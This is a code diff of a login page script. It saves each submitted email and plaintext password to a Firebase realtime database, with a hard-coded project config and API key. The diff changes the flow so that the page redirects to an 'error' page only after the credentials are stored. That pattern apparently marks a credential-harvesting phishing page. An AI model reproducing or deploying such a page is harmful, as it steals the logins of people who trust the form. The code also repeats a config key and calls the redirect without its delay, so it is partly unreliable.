@@ -157,13 +157,14 @@
         import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-database.js";      
         
         const firebaseConfig = {
-          apiKey: "AIzaSyCfOdqwlCKwQk8wTAy2Rwz1h_z2L1pDm8s",
-          authDomain: "login-form101.firebaseapp.com",
-          projectId: "login-form101",
-          storageBucket: "login-form101.appspot.com",
-          messagingSenderId: "127378397127",
-          appId: "1:127378397127:web:6c898cb2da67c314f4abe2",
-          databaseURL: "https://login-form101-default-rtdb.asia-southeast1.firebasedatabase.app"
+            apiKey: "AIzaSyCfOdqwlCKwQk8wTAy2Rwz1h_z2L1pDm8s",
+            authDomain: "login-form101.firebaseapp.com",
+            databaseURL: "https://login-form101-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "login-form101",
+            storageBucket: "login-form101.appspot.com",
+            messagingSenderId: "127378397127",
+            appId: "1:127378397127:web:6c898cb2da67c314f4abe2",
+            databaseURL: "https://login-form101-default-rtdb.asia-southeast1.firebasedatabase.app/"
         };
       
         
@@ -192,17 +193,15 @@
             email: email,
             password: password,
             last_login: Date.now() 
-            })
-            
-            function redirectAfterDelay(url, delay) {
-            setTimeout(function() {
-                window.location.href = url;
-            }, delay);
-            }
-            redirectAfterDelay("error", 1000)
-
+            })    
             .then(() => {
                 console.log("User data saved to database");
+                function redirectAfterDelay(url, delay) {
+                setTimeout(function() {
+                    window.location.href = url;
+                }, delay);
+                }
+                redirectAfterDelay("error")
             })
             .catch((error) => {
                 console.error("Error saving user data");
